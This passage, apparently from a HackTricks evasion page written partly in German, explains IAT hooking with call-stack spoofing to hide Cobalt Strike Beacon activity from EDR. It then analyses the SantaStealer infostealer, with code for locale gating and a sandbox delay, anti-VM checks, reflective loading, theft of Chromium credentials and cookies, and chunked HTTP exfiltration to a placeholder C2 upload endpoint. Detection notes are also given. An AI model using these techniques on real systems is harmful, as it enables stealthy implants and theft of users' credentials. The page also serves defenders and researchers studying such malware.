- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Betriebliche Integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Erkennung/DFIR‑Überlegungen
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Verwandte Bausteine und Beispiele
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft für dateifreie Umgehung und Diebstahl von Zugangsdaten

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Tastaturlayout‑Gating & Sandbox‑Verzögerung

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mehrschichtige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollenden Prüfsumme und vergleicht ihn mit eingebetteten Blocklisten für Debugger/Sandboxen; sie wiederholt die Checksumme über den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B prüft Systemeigenschaften (untere Prozessanzahl, kürzliche Uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox-Erweiterungen zu erkennen, und führt Timing-Checks rund um Schlafaufrufe durch, um Single-Stepping zu entdecken. Jeder Treffer bricht ab, bevor Module gestartet werden.

### Fileless helper + double ChaCha20 reflective loading

- Die primäre DLL/EXE bettet einen Chromium-Credential-Helfer ein, der entweder auf Disk abgelegt oder manuell in den Speicher gemappt wird; im Fileless-Modus löst dieser Helfer Imports/Relocations selbst auf, sodass keine Helfer-Artefakte geschrieben werden.
- Dieser Helfer speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Keys + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (kein `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, abgeleitet von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um in einen laufenden Chromium-Browser zu injizieren, AppBound Encryption-Keys zu übernehmen und Passwörter/Cookies/Kreditkartendaten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz ABE-Härtung.


### Modulare In-Memory-Erfassung & chunked HTTP exfil

- `create_memory_based_log` iteriert über eine globale `memory_generators`-Function-Pointer-Tabelle und startet einen Thread pro aktiviertem Modul (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Jeder Thread schreibt Ergebnisse in Shared-Buffers und meldet seine Dateianzahl nach einem ~45s Join-Fenster.
- Sobald fertig, wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft dann 15s und streamt das Archiv in 10 MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) gefälscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` hinzu, und der letzte Chunk hängt `complete: true` an, damit der C2 weiß, dass die Rekonstruktion abgeschlossen ist.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
